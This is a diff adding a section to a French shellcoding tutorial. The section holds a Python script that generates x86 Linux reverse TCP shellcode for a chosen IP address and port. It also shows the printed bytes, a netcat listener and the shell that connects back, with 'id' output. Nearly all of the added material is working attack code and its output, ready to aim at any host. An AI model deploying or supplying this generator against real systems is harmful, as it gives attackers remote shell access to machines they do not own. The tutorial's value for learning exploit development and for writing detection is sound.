@@ -164,3 +164,52 @@ nc -l -p 4444 -v
 pwd
 /home/xophidia
 ```
+
+## Améliorer la saisie de l'adresse IP et du port ##
+
+Pour cette partie, python s'avère être plus pratique que le C.
+
+```python
+#!/usr/bin/env python
+
+import argparse
+import struct
+
+def main():
+    parser = argparse.ArgumentParser(description="Reverser TCP Shell")
+    parser.add_argument('--address', dest="addressIp", default=None, type= str, help="Put your address ip", required=True)
+    parser.add_argument('--port', dest="port", default=4444, type=int, help="Put the port", required=True)
+    args = parser.parse_args()
+
+    ip = args.addressIp.split('.')
+    port = args.port
+
+    shellcode = ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68"+
+    struct.pack("!4B",int(ip[0]), int(ip[1]),int(ip[2]), int(ip[3]))+"\x66\x68"+struct.pack("!H",port)+"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80");
+
+
+    print '"' + ''.join('\\x%02x' % ord(c) for c in shellcode) + '";'
+
+if __name__=='__main__':
+    main()
+
+```
+
+### Test ###
+
+```c
+./reverse_script.py --address 127.1.1.1 --port 1234
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10
+\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68
+\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
+````
+
+Nous recompilons comme lors de l'exemple précédent puis testons le tout.
+
+```c
+nc -l 127.1.1.1 -p 1234 -v
+Listening on [127.1.1.1] (family 0, port 1234)
+Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 40102)
+id
+uid=1000(xophidia) gid=1000(xophidia) groups=1000(xophidia),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
